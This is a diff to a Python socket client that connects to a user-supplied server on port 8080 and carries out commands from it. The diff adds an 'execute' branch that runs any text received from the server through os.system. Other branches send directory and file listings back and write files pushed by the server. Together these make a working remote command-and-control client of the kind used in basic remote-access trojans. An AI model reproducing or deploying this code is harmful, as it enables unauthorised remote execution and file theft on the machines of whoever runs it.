@@ -9,6 +9,7 @@ init()
 
 s = socket.socket() #socket instance
 port = 8080 
+#insert host ip
 host = input(str("Please enter the server address: ")) #asking for the server that the user want to connect
 s.connect((host, port)) #connect to the server
 print("\nConnected to the server successfully")
@@ -28,6 +29,18 @@ while True:
         s.send(directory.encode()) #send the info encoded to server script
         s.send(files.encode())
         print("\nCommand has been executed successfully...")
+
+    elif command == "execute":
+        program = s.recv(5000)
+        program = program.decode()
+        try:
+            execution = os.system(program)                
+            output = "\nCommand has been executed"
+            print(output)
+            #s.send(output.encode())
+        except Exception as e:
+            #s.send(str(e.encode()))
+            pass
 
     elif command == "custom_dir":
         try:
@@ -67,7 +80,7 @@ while True:
             s.send(error.encode()) #send error message
             print(error)
 
-    elif command == 'send_file':
+    elif command == 'send_file': # WARNING: doesnt works with exe files
         fileName = s.recv(6000)
         fileName = fileName.decode()
         newFile = open(fileName, 'wb') #create a file with same name and extention of the original file
